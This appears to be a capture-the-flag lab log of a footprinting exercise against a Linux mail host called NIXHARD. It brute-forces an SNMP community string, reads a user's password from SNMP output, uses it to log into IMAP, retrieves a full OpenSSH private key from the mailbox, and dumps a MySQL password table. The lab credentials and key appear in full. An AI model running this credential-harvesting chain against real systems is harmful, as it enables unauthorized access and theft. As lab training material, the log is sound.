# General Scan
nmap -sV -oA nmap $TARGET --stats-every=5s

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
110/tcp open  pop3     Dovecot pop3d
143/tcp open  imap     Dovecot imapd (Ubuntu)
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp open  ssl/pop3 Dovecot pop3d
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

143/993 : IMAP
110/995 : POP3
22 : SSH

# IMAP and POP3 Scan

sudo nmap -oA nmap-imap_pop3 $TARGET -sV -p110,143,993,995 -sC

\# Nmap 7.93 scan initiated Mon Oct 23 20:08:43 2023 as: nmap -oA nmap-imap_pop3 -sV -p110,143,993,995 -sC 10.129.202.20
Nmap scan report for 10.129.202.20
Host is up (0.012s latency).

PORT    STATE SERVICE  VERSION
110/tcp open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: USER UIDL TOP RESP-CODES PIPELINING STLS CAPA SASL(PLAIN) AUTH-RESP-CODE
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
143/tcp open  imap     Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_imap-capabilities: more AUTH=PLAINA0001 listed have IDLE STARTTLS capabilities Pre-login ENABLE SASL-IR LITERAL+ ID post-login OK LOGIN-REFERRALS IMAP4rev1
|_ssl-date: TLS randomness does not represent time
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_imap-capabilities: more listed have IDLE ID capabilities Pre-login ENABLE SASL-IR LITERAL+ LOGIN-REFERRALS post-login OK IMAP4rev1 AUTH=PLAINA0001
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: PIPELINING SASL(PLAIN) CAPA UIDL USER TOP AUTH-RESP-CODE RESP-CODES
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Mon Oct 23 20:08:59 2023 -- 1 IP address (1 host up) scanned in 16.06 seconds


# Collected information

commonName=NIXHARD
DNS:NIXHARD
organizationName=?
Community String : backup


# Direct connections

curl -k 'imaps://$TARGET' --user user:p4ssw0rd -v
openssl s_client -connect $TARGET:pop3s
openssl s_client -connect $TARGET:imaps
openssl s_client -connect $TARGET:imaps -crlf

nc $TARGET 143
nc $TARGET 110

# SNMPWALK

snmpwalk -v1 -c public $TARGET
snmpwalk -v2c -c public $TARGET
snmpwalk -v3 -c public $TARGET

Timeout: No Response from 10.129.202.20

# ONESIXTYONE

onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt $TARGET

Scanning 1 hosts, 3220 communities
10.129.202.20 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64

Community String : backup

# SNMPWALK with the community string retreived using OneSixtyOne 

snmpwalk -v2c -c backup $TARGET

iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (258311) 0:43:03.11
iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
iso.3.6.1.2.1.1.6.0 = STRING: "Inlanefreight"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (14) 0:00:00.14
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (259312) 0:43:13.12
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E7 0A 19 0B 12 14 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.4.0-90-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 160
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.1.1.0 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
iso.3.6.1.2.1.25.1.7.1.2.1.4.6.66.65.67.75.85.80 = ""
iso.3.6.1.2.1.25.1.7.1.2.1.5.6.66.65.67.75.85.80 = INTEGER: 5
iso.3.6.1.2.1.25.1.7.1.2.1.6.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.7.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.20.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.2.1.21.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.3.1.1.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.3.1.2.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:
Authentication token manipulation error
chpasswd: (line 1, user tom) password not changed
Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.3.1.3.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.3.1.4.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.1 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.2 = STRING: "Authentication token manipulation error"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.3 = STRING: "chpasswd: (line 1, user tom) password not changed"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = STRING: "Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = No more variables left in this MIB View (It is past the end of the MIB tree)

# Braa


sudo apt install braa
braa backup@$TARGET:.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80
10.129.202.20:20ms:.80:Error [2] No such name.
braa backup@$TARGET:.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80.*
10.129.202.20:20ms:.80:Error [2] No such name.
braa backup@$TARGET:.3.6.1.2.1.25.1.7.1.2.1.2.*
10.129.202.20:21ms:.2:Error [2] No such name.
braa backup@$TARGET:.3.6.1.*
braa backup@$TARGET:.1.3.6.*

10.129.202.20:40ms:.0:Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
10.129.202.20:20ms:.0:.10
10.129.202.20:20ms:.0:329589
10.129.202.20:20ms:.0:Admin <tech@inlanefreight.htb>
10.129.202.20:20ms:.0:NIXHARD
10.129.202.20:20ms:.0:Inlanefreight
10.129.202.20:20ms:.0:72
10.129.202.20:21ms:.0:14
10.129.202.20:20ms:.1:.1
10.129.202.20:21ms:.2:.1
10.129.202.20:20ms:.3:.1
10.129.202.20:21ms:.4:.1
10.129.202.20:20ms:.5:.1
10.129.202.20:21ms:.6:.49
10.129.202.20:20ms:.7:.4
10.129.202.20:20ms:.8:.50
10.129.202.20:20ms:.9:.3
10.129.202.20:20ms:.10:.92
10.129.202.20:40ms:.1:The SNMP Management Architecture MIB.
10.129.202.20:20ms:.2:The MIB for Message Processing and Dispatching.
10.129.202.20:20ms:.3:The management information definitions for the SNMP User-based Security Model.
10.129.202.20:20ms:.4:The MIB module for SNMPv2 entities
10.129.202.20:20ms:.5:View-based Access Control Model for SNMP.
10.129.202.20:20ms:.6:The MIB module for managing TCP implementations
10.129.202.20:20ms:.7:The MIB module for managing IP and ICMP implementations
10.129.202.20:20ms:.8:The MIB module for managing UDP implementations
10.129.202.20:20ms:.9:The MIB modules for managing SNMP Notification, plus filtering.
10.129.202.20:20ms:.10:The MIB module for logging SNMP Notifications.
10.129.202.20:20ms:.1:14
10.129.202.20:20ms:.2:14
10.129.202.20:20ms:.3:14
10.129.202.20:20ms:.4:14
10.129.202.20:21ms:.5:14
10.129.202.20:20ms:.6:14
10.129.202.20:21ms:.7:14
10.129.202.20:20ms:.8:14
10.129.202.20:21ms:.9:14
10.129.202.20:20ms:.10:14
10.129.202.20:21ms:.0:330633
10.129.202.20:20ms:.0:�


10.129.202.20:21ms:.0:393216
10.129.202.20:20ms:.0:BOOT_IMAGE=/vmlinuz-5.4.0-90-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity

10.129.202.20:21ms:.0:0
10.129.202.20:20ms:.0:159
10.129.202.20:21ms:.0:0
10.129.202.20:20ms:.0:1
10.129.202.20:21ms:.80:/opt/tom-recovery.sh
10.129.202.20:20ms:.80:tom NMds732Js2761
10.129.202.20: Message cannot be decoded!
10.129.202.20: Message cannot be decoded!
10.129.202.20: Message cannot be decoded!

# SSH connections

ssh -v tom@$TARGET -o PreferredAuthentications=password
NMds732Js2761
Permission denied

ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no tom@$TARGET

ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no -o PasswordAuthentication=yes tom@$TARGET
tom@10.129.202.20: Permission denied (publickey).

# Direct connections

curl -k 'imaps://$TARGET' --user tom:NMds732Js2761 -v
curl -k 'imaps://10.129.202.20' --user tom:NMds732Js2761 -v


openssl s_client -connect $TARGET:imaps
LOGIN tom NMds732Js2761
1 LOGIN tom NMds732Js2761
1 LIST "" *

    * LIST (\HasNoChildren) "." Notes
    * LIST (\HasNoChildren) "." Meetings
    * LIST (\HasNoChildren \UnMarked) "." Important
    * LIST (\HasNoChildren) "." INBOX


1 SELECT INBOX

    * OK [CLOSED] Previous mailbox closed.
    * FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
    * OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
    * 1 EXISTS
    * 0 RECENT
    * OK [UIDVALIDITY 1636509064] UIDs valid
    * OK [UIDNEXT 2] Predicted next UID
    1 OK [READ-WRITE] Select completed (0.001 + 0.000 secs).

1 FETCH 1 (BODY[TEXT])

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----


# SSH CONNECTION

vi id_rsa
chmod 600 id_rsa

ssh tom@$TARGET -i id_rsa

# BASH HISTORY CONSULTATION
history

# MYSQL Connection
mysql -u tom -p
NMds732Js2761


show databases;
show tables;
show columns from users;
select username,password from users where username="HTB";

+----------+------------------------------+
| username | password                     |
+----------+------------------------------+
| HTB      | cr3n4o7rzse7rzhnckhssncif7ds |
+----------+------------------------------+
1 row in set (0.00 sec)
